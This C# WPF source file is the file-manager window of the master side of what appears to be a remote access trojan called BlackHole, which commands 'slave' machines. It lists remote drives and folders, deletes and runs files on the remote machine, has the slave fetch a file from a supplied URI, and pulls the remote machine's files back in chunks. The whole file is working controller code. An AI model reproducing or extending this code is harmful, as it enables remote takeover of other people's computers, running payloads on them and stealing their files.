﻿using System;
using System.IO;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Model;
using BlackHole.Master.Remote;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class FileManager
    {
        /// <summary>
        /// 
        /// </summary>
        public ViewModelCollection<FileMeta> ViewModelFiles
        {
            get;
        }

        /// <summary>
        /// 
        /// </summary>
        private long m_sucessfulTransactions, m_totalTransactions;

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public FileManager(Slave slave) : base(slave)
        {
            InitializeComponent();
            
            Loaded += OnNavigate;
            
            FileTransactionsList.DataContext = ViewModelCommands;
            FilesList.DataContext = ViewModelFiles = new ViewModelCollection<FileMeta>();
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="name"></param>
        private string GetFilePath(string name) => Path.Combine(TxtBoxDirectory.Text, name);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnDeleteFile(object sender, RoutedEventArgs e) => DeleteSelectedFiles();

        /// <summary>
        /// 
        /// </summary>
        private void DeleteSelectedFiles() =>
            ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
            {
                if (meta.Type == FileType.FILE)
                    DeleteFile(meta.Name);
            });


        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnExecuteFile(object sender, RoutedEventArgs e)
             => ExecuteSelectedFiles();

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnGoToDrives(object sender, RoutedEventArgs e) 
            => NavigateToDrives();

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnNavigate(object sender, RoutedEventArgs e) 
            => NavigateToTypedFolder();

        /// <summary>
        /// 
        /// </summary>
        private void NavigateToTypedFolder()
            => NavigateToFolder(TxtBoxDirectory.Text);

        /// <summary>
        /// 
        /// </summary>
        private void NavigateToDrives() 
            => NavigateToFolder(string.Empty, true);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnUpload(object sender, RoutedEventArgs e) 
            => UploadTypedFile();

        /// <summary>
        /// 
        /// </summary>
        private void UploadTypedFile() 
            => UploadFile(TxtBoxUpload.Text);

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnFolderDoubleClick(object sender, MouseButtonEventArgs e)
        {
            var file = ((ListViewItem)sender).Content as FileMeta;
            if (file.Type == FileType.FOLDER)
                NavigateToFolder(file.Name);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnDownloadFile(object sender, RoutedEventArgs e) 
            => DownloadSelectedFiles();

        /// <summary>
        /// 
        /// </summary>
        private void DownloadSelectedFiles() => 
            ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
            {
                if (meta.Type == FileType.FILE)
                    DownloadFile(meta.Name);
            });

        /// <summary>
        /// 
        /// </summary>
        private void ExecuteSelectedFiles() =>
            ExecuteOnSelectedItems<FileMeta>(FilesList, (meta) =>
            {
                if (meta.Type == FileType.FILE)
                    ExecuteFile(meta.Name);
            });

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void OnCancelTransaction(object sender, RoutedEventArgs e)
            => CancelSelectedTransactions();

        /// <summary>
        /// 
        /// </summary>
        private void CancelSelectedTransactions() =>
            ExecuteOnSelectedItems<IRemoteCommand>(FileTransactionsList, (transaction) => CancelCommand(transaction.Id));

        /// <summary>
        /// 
        /// </summary>
        /// <param name="folder"></param>
        private void NavigateToFolder(string folder, bool drives = false) =>
            Send(new NavigateToFolderMessage()
            {
                Drives = drives,
                Path = Path.Combine(TxtBoxDirectory.Text, folder)
            });      
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="name"></param>
        private void DeleteFile(string name) => 
            Send(new DeleteFileMessage()
            {
                FilePath = GetFilePath(name)
            });

        /// <summary>
        /// 
        /// </summary>
        /// <param name="name"></param>
        private void ExecuteFile(string name) =>
            Send(new ExecuteFileMessage()
            {
                FilePath = GetFilePath(name)
            });
        
        /// <summary>
        /// 
        /// </summary>
        /// <param name="uri"></param>
        private void UploadFile(string uri)
        {
            var fileName = Path.GetFileName(uri);
            AddCommand(CommandFactory.CreateCommand<UploadProgressMessage>(
                CommandType.UPLOAD,
                Slave,
                fileName,
                (command) =>
                {
                    Send(new UploadFileMessage()
                    {
                        Id = command.Id,
                        Path = GetFilePath(fileName),
                        Uri = uri,
                    });
                },
                (progress) =>
                {
                    // nothing to do on continue
                },
                (progress) =>
                {
                    FireSlaveEvent(SlaveEventType.FILE_UPLOADED, fileName);
                    FinishCurrentCommand();
                    NavigateToTypedFolder();
                },
                () =>
                {
                    FinishCurrentCommand();
                }));
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="path"></param>
        private void DownloadFile(string name)
        {
            var filePath = GetFilePath(name);

            AddCommand(CommandFactory.CreateCommand<DownloadedFilePartMessage>(
                CommandType.DOWNLOAD,
                Slave,
                name,

                (command) => // execute
                {
                    Send(new DownloadFilePartMessage()
                    {
                        Id = command.Id,
                        CurrentPart = 0,
                        Path = filePath
                    });
                },
                (download) => // continue
                {
                    try
                    {
                        FileHelper.WriteDownloadedPart(Slave.OutputDirectory, download.Path, download.CurrentPart, download.RawPart);
                        
                        Send(new DownloadFilePartMessage()
                        {
                            Id = download.Id,
                            Path = download.Path,
                            CurrentPart = download.CurrentPart + 1
                        });
                    }
                    catch(Exception e)
                    {
                        FireFailedStatus(download.Id, "Downloading", e.Message);
                    }
                },
                (download) => // complete
                {
                    try
                    {
                        FileHelper.WriteDownloadedPart(Slave.OutputDirectory, download.Path, download.CurrentPart, download.RawPart);
                        //TotalTransaction.Content = $"Successful transactions: {++m_sucessfulTransactions}/{m_totalTransactions}";
                        FireSlaveEvent(SlaveEventType.FILE_DOWNLOADED, Path.GetFileName(download.Path));
                        FinishCurrentCommand();
                    }
                    catch (Exception e)
                    {
                        FireFailedStatus(download.Id, "Downloading", e.Message);
                    }
                },
                () => // fault
                {
                    FinishCurrentCommand();
                }));

            m_totalTransactions++;
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async void OnEvent(SlaveEvent ev)
        {
            base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.INCOMMING_MESSAGE:
                        ev.Data
                            .Match()
                            .With<FolderNavigationMessage>(m =>
                            {
                                TxtBoxDirectory.Text = m.Path;
                                ViewModelFiles.Items.Clear();
                                m.Files.ForEach(ViewModelFiles.AddItem);
                            })
                            .With<DownloadedFilePartMessage>(m =>
                            {
                                UpdateCommand(m,
                                    (command) =>
                                    {
                                        command.Completed = m.CurrentPart >= m.TotalPart;
                                        command.UpdateProgression(m.CurrentPart + 1, m.TotalPart);
                                    });
                            })
                            .With<UploadProgressMessage>(m =>
                            {
                                // will be received when the slave download the file
                                UpdateCommand(m,
                                    (command) =>
                                    {
                                        command.Completed = m.Percentage == -1;
                                        if (!command.Completed)
                                            command.UpdateProgression(m.Percentage, 100);
                                    });
                            })
                            .With<FileDeletionMessage>(m =>
                            {
                                NavigateToTypedFolder();
                            });                        
                        break;
                }
            });
        }     
    }
}